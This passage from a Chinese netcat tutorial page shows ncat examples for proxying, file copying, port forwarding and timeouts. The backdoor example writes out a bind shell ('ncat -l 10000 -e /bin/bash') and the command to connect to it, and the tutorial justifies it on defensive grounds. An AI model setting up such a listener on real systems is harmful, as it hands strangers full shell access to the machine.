class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>之后开始发送消息，这些消息会在服务器终端上显示出来。</p>\n<h3 id=\"toc_5\">例子： 5) 将 <code>nc</code> 作为代理</h3>\n<p><code>nc</code> 也可以用来做代理。比如下面这个例子，<br>\n<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4a7012284886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 8080 | ncat 192.168.1.200 80</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4a7012284886-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4a7012284886-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.200</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4aa438155290\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mkfifo 2way\r\n$ ncat -l 8080 0&lt;2way | ncat 192.168.1.200 80 1&gt;2way</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4aa438155290-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6354523a4aa438155290-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4aa438155290-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">mkfifo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2way</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6354523a4aa438155290-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">2way</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.200</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">2way</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>现在你可以通过 <code>nc</code> 代理来收发数据了。</p>\n<h3 id=\"toc_6\">例子： 6) 使用 <code>nc</code> 拷贝文件</h3>\n<p><code>nc</code> 还能用来在系统间拷贝文件，虽然这么做并不推荐，因为绝大多数系统默认都安装了 <code>ssh</code>/<code>scp</code>。 不过如果你恰好遇见个没有 <code>ssh</code>/<code>scp</code> 的系统的话， 你可以用 <code>nc</code> 来作最后的努力。</p>\n<p>在要接受数据的机器上启动 <code>nc</code> 并让它进入监听模式：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4af718105074\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l  8080 &gt; file.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4af718105074-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4af718105074-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在去要被拷贝数据的机器上运行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4b3478096468\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 8080 --send-only &lt; data.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4b3478096468-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4b3478096468-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">send</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">only</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这里，<code>data.txt</code> 是要发送的文件。 <code>-–send-only</code> 选项会在文件拷贝完后立即关闭连接。 如果不加该选项， 我们需要手工按下 <code>ctrl+c</code> 来关闭连接。</p>\n<p>我们也可以用这种方法拷贝整个磁盘分区，不过请一定要小心。</p>\n<h3 id=\"toc_7\">例子： 7) 通过 <code>nc</code> 创建后门</h3>\n<p><code>nc</code> 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4b7101034891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l 10000 -e /bin/bash</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4b7101034891-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4b7101034891-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bash</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><code>-e</code> 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4ba943682387\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 10000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4ba943682387-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4ba943682387-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">例子： 8) 通过 <code>nc</code> 进行端口转发</h3>\n<p>我们通过选项 <code>-c</code> 来用 <code>nc</code> 进行端口转发，实现端口转发的语法为：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4bd914439033\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -u -l  80 -c  'ncat -u -l 8080'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4bd914439033-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4bd914439033-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\">  </span><span class=\"crayon-s\">'ncat -u -l 8080'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这样，所有连接到 80 端口的连接都会转发到 8080 端口。</p>\n<h3 id=\"toc_9\">例子： 9) 设置连接超时</h3>\n<p><code>nc</code> 的监听模式会一直运行，直到手工终止。 不过我们可以通过选项 <code>-w</code> 设置超时时间:<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4c0673224714\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -w 10 192.168.1.100 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4c0673224714-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4c0673224714-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这回导致连接 10 秒后终止，不过这个选项只能用于客户端而不是服务端。</p>\n<h3 id=\"toc_10\">例子： 10) 使用 <code>-k</code> 选项强制 <code>nc</code> 待命</h3>\n<p>当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 <code>-k</code> 我们可以强制服务器保持连接并继续监听端口。 命令如下：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6354523a4c4047933229\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div 